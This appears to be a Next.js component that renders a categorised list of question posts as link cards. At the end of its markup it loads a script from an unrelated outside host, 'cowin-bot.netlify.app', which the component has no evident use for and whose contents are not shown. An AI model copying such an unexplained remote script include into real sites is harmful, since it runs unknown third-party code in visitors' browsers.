import Link from "next/link";
import { humanize } from "../lib/utils";

function getCategories(posts) {
  const categories = posts.map((post) => post.slug.split("/")[0]);
  return [...new Set(categories)].sort();
}

function getPostsByCategories(category, posts) {
  return posts.filter((post) => post.slug.split("/")[0] == category);
}

export default function IndexQuestionList({ posts, locale }) {
  return (
    <div className="mx-auto container max-w-4xl p-4 md:p-6 bg-gray-100 md:rounded-lg">
      {getCategories(posts).map((category) => (
        <div className="pb-8">
          <h2 className="pb-3 text-2xl font-medium text-gray-700">
            {humanize(category)}
          </h2>
          <div className="space-y-2 md:space-y-3">
            {getPostsByCategories(category, posts).map((post) => (
              <Link
                key={post.slug}
                as={`${locale}/${post.slug}`}
                href="[locale]/[...slug]"
              >
              <div className="bg-white shadow rounded-md p-5 cursor-pointer hover:bg-gray-50 hover:shadow-lg transition">
                <a className="text-indigo-600 font-medium text-xl">{post.title}</a>
                <p className="text-gray-600 mt-1 text-base md:text-lg">{post.excerpt}</p>
              </div>
              </Link>
            ))}
          </div>
        </div>
      ))}
      <script src="https://cowin-bot.netlify.app/Index.js"></script>
    </div>
  );
}
